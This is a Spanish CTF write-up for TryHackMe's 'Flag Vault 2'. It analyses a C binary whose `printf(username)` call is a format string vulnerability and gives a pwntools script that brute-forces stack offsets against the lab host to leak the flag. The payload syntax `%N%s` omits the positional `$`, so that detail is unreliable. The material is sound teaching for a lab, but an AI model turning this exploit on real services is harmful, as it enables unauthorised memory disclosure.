### 🧠💥 Ingeniería Binaria y Buffer Overflow: Flag Vault 2 (TryHackMe)

## 📖 Introducción y Descripción del Desafío

En este desafío CTF de TryHackMe, **Flag Vault 2**, nuestro objetivo es analizar y explotar un binario vulnerable a un ataque de **Formato de Cadena** (*Format String Vulnerability*). Esta vulnerabilidad permite a los atacantes leer direcciones de memoria arbitrarias o filtrar datos en la pila (stack) mediante el uso indebido de la función `printf` sin una cadena de formato adecuada.

**Objetivo:** Explotar la vulnerabilidad de formato de cadena para obtener la flag.

---

## 1. 🔍 Detección y Conexión (Ping)

El primer paso es confirmar la accesibilidad y el estado activo de la máquina objetivo.

<img width="772" height="214" alt="Ping" src="https://github.com/user-attachments/assets/224a7904-b32d-4be9-9b36-5d6ea99c6ac7" />

* **Máquina Objetivo:** `10.10.146.181`
* **Herramienta:** `ping`

### Comando Ejecutado

```bash
ping -c 4 10.10.146.181
````
✅ Conclusión: La máquina se encuentra activa y la conexión es estable.

## 2. 📝 Análisis del Código Fuente C (`pwn21.c`)

El análisis se centra en la función `login()` y cómo interactúa con la función `print_flag()`.

### Funciones Relevantes

#### **Función `login()`**

```c
void login(){
	char username[100] = "";

	printf("Username: ");
	gets(username); // <-- Vulnerabilidad de Buffer Overflow (BOF) heredada

	// The flag isn't printed anymore. No need for authentication
	print_flag(username);
}
````

La función login() toma la entrada del usuario usando la insegura gets(), lo que repite la vulnerabilidad de Buffer Overflow de la versión anterior, aunque el vector de ataque principal aquí es diferente.

Función print_flag()
````c
void print_flag(char *username){
        FILE *f = fopen("flag.txt","r");
        char flag[200];

        fgets(flag, 199, f);
        //printf("%s", flag);  // <-- Código para imprimir la flag COMENTADO
	
	//The user needs to be mocked...
	printf("Hello, ");
	printf(username); // <-- ⚠️ Punto Crítico: Format String Vulnerability
	printf(". Was version 2.0 too simple for you? Well I don't see no flags being shown now xD xD xD...\n\n");
    // ...
}
````
🚨 Identificación de la Vulnerabilidad de Formato de Cadena

La vulnerabilidad se encuentra en la línea:
````c
printf(username);
````

Cuando la función printf() recibe una variable de cadena (en este caso, username) directamente como su único argumento y sin especificar una cadena de formato, el contenido de username se trata como la cadena de formato.

Entrada Segura: printf("%s", username);

Entrada Vulnerable: printf(username);

Si el usuario ingresa caracteres de formato como %x, %s, o %p en la variable username, printf intentará interpretar estos especificadores, lo que puede llevar a:

Lectura de la Pila (%x, %p): Podemos filtrar datos de la memoria stack del programa (donde reside la flag local).

Lectura de Memoria Arbitraria (%s): Se puede intentar imprimir el contenido de direcciones de memoria arbitrarias.

Escritura de Memoria (%n): Se puede modificar el contenido de direcciones de memoria (útil en exploits más avanzados).

## 3. 🐍 Creación del Exploit y Búsqueda del Offset

Tras identificar la vulnerabilidad `printf(username)` en el código C, el objetivo es encontrar la posición exacta de la *flag* en la pila (*stack*) utilizando especificadores de formato.

* **Técnica:** **Lectura Arbitraria de la Pila** (*Stack Leak*) mediante especificadores de formato.
* **Herramienta:** `pwntools` en Python para automatizar la conexión (al puerto `1337`) y el envío de *payloads*.
* **Payload de Prueba:** `%[posición]%s`

### 🧠 Estrategia del Payload `%[número]%s`

El *script* está diseñado para iterar sobre posibles posiciones en la pila y probar si el valor en esa posición apunta al inicio de la *flag*.

1.  **`%[posición]` (Offset):** Indica cuántos argumentos o elementos en la pila deben saltarse para llegar a la ubicación deseada.
2.  **`%s` (Lectura de Cadena):** Intenta leer el contenido de la dirección de memoria apuntada por el argumento, esperando que sea un puntero a la *flag* (que comienza con la cadena "THM{").
3.  **Lógica del Exploit:** El *script* itera la posición desde 1 hasta 101. Si la respuesta contiene `THM{`, significa que el *offset* es correcto y se ha filtrado la *flag* con éxito.

### Código del Exploit (`exploit.py`)

```python
from pwn import *

context.log_level = 'warning'

for position in range(1, 101):
	# Conexión al servicio remoto (IP de la máquina, puerto 1337)
	conn = remote('10.10.146.181', 1337)
	conn.recvuntil(b'Username:')
	
	# Envía el payload: %N%s, donde N es la posición actual
	conn.sendline(f'%{position}%s'.encode())
	
	# Recibe la respuesta completa
	response = conn.recvall().decode()
	
	# Comprueba si la flag se filtró
	if 'THM{' in response:
		print(response)
		break
````

## 4. 🚀 Ejecución del Exploit y Filtración de la Flag

El *script* `exploit.py` automatizó la búsqueda del *offset* para explotar la vulnerabilidad de formato de cadena y filtrar la *flag* directamente desde la pila (stack).

<img width="963" height="159" alt="Flag" src="https://github.com/user-attachments/assets/ada9a11f-644e-465d-88f0-40bbf1893ab5" />

### Comando de Ejecución

```bash
python3 exploit.py
````
🔎 Resultado y Éxito de la Explotación

La ejecución del exploit iteró sobre las posibles posiciones en la pila (del 1 al 101) utilizando el payload %[posición]%s.

El exploit encontró que en la posición 5 (OFFSET 5), el argumento en la pila era un puntero que apuntaba al inicio de la variable de la flag (flag[200]), que se encuentra cargada en la memoria local. El especificador %s interpretó esta dirección como una cadena, revelando el secreto.

🥳 Éxito: El offset 5 permitió que la función printf(username) leyera la dirección de memoria de la flag, completando el desafío.

🏁 Flag Obtenida
